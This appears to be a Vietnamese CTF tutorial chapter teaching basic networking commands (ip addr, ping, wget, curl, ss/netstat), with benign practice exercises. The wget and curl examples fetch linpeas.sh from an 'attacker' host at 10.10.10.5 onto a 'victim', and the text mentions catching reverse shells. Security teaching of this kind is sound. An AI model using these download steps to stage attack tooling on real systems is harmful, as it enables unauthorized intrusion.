# Chương 4 — Mạng Cơ Bản và Tải File

Trong CTF, bạn thường cần kết nối tới máy chủ (target), tải công cụ exploit từ máy attacker lên victim, hoặc tải tài nguyên từ Internet. Chương này giới thiệu các lệnh mạng cơ bản hữu dụng nhất.

---

## 1. `ip addr` (hoặc `ifconfig`) — "Tôi là ai?"

Trước khi kết nối, bạn cần biết địa chỉ IP của mình.

- `ifconfig`: Lệnh cũ, vẫn dùng được trên nhiều hệ thống.
- `ip addr`: Lệnh mới, mạnh hơn và phổ biến trên Linux hiện đại.

**Ví dụ:**

```
ip addr show
```

- `lo`: loopback — luôn là `127.0.0.1`.
- `eth0`/`enp0s3`/...: card mạng chính — địa chỉ nội bộ như `192.168.x.x`.

Trong CTF, địa chỉ attacker thường cần thiết để nhận reverse shell.

---

## 2. `ping` — "Bạn có ở đó không?"

Gửi gói tin ICMP để kiểm tra kết nối.

**Ví dụ:**

```
ping google.com
# Hoặc giới hạn số lần ping
ping -c 4 8.8.8.8
```

Dùng `Ctrl+C` để dừng ping.

---

## 3. `wget` — Tải file (Cách 1)

`wget` là công cụ tải file từ web, thường có sẵn trên máy chủ.

**Ví dụ CTF:** tải `linpeas.sh` từ máy attacker (`10.10.10.5`):

```
wget http://10.10.10.5/linpeas.sh
```

**Tùy chọn:**

- `-O <tên_file>`: lưu với tên khác.

```
wget http://10.10.10.5/linpeas.sh -O /tmp/kiemtra.sh
```

---

## 4. `curl` — Tải file và nhiều hơn thế (Cách 2)

`curl` là công cụ mạnh mẽ (gửi POST, tương tác API, v.v.). Dùng `-o` để lưu file:

```
curl http://10.10.10.5/linpeas.sh -o linpeas.sh
# Hoặc dùng chuyển hướng
curl http://10.10.10.5/linpeas.sh > linpeas.sh
```

**Lưu ý:** một số máy có `wget` nhưng không có `curl`, hoặc ngược lại — hãy linh hoạt.

---

## 5. `ss` (hoặc `netstat`) — "Ai đang lắng nghe?"

Xem cổng (port) nào đang mở và tiến trình nào đang dùng cổng đó.

**Cú pháp thường dùng:**

```
ss -tulpn
# Hoặc
netstat -tulpn
```

- `-t`: TCP
- `-u`: UDP
- `-l`: listening (đang lắng nghe)
- `-p`: tiến trình (program)
- `-n`: không phân giải tên

**Ví dụ output phân tích:**

- `127.0.0.1:3306` — MySQL đang chạy.
- `0.0.0.0:22` — SSH đang lắng nghe trên tất cả interface.
- `0.0.0.0:80` — Web server (apache/nginx).

Biết dịch vụ nào đang chạy giúp bạn chọn vectơ tấn công tiếp theo.

---

## 6. Bài tập thực hành

1. Dùng `ip addr` hoặc `ifconfig` để tìm địa chỉ IP nội bộ.
2. Dùng `ping -c 4 google.com` để kiểm tra kết nối Internet.
3. Tìm một ảnh (ví dụ logo trên Wikipedia), sao chép URL của ảnh.
4. Dùng `wget <URL>` để tải ảnh về.
5. Xóa ảnh (`rm <tên_file>`).
6. Dùng `curl <URL> -o <tên_file>` để tải lại ảnh.
7. Trên Linux/macOS, chạy `ss -tulpn` (Windows: `netstat -an`) và xem các cổng đang lắng nghe.

---

### Kết thúc Chương 4

Bạn đã học cách kiểm tra địa chỉ IP, kiểm tra kết nối (ping), tải file bằng `wget` và `curl`, và xem dịch vụ/cổng đang mở với `ss`/`netstat`. Ở **Chương 5**, ta sẽ học về **Biến môi trường** và **viết script Bash cơ bản** để tự động hóa công việc CTF.

---
